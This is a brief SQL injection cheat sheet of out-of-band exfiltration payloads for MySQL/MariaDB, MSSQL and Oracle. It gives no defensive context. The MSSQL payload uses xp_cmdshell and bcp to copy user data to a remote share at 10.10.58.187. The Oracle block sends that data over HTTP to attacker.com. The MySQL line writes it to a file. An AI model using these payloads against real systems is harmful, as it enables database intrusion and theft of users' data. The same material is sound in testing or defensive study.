# SQL Injection

## Out-of-band Injection
### MySQL and MariaDB
```sql
SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';
```
### Microsoft SQL Server (MSSQL)
```sql
EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';
```
### Oracle
```sql
DECLARE
  req UTL_HTTP.REQ;
  resp UTL_HTTP.RESP;
BEGIN
  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
  UTL_HTTP.GET_RESPONSE(req);
END;
```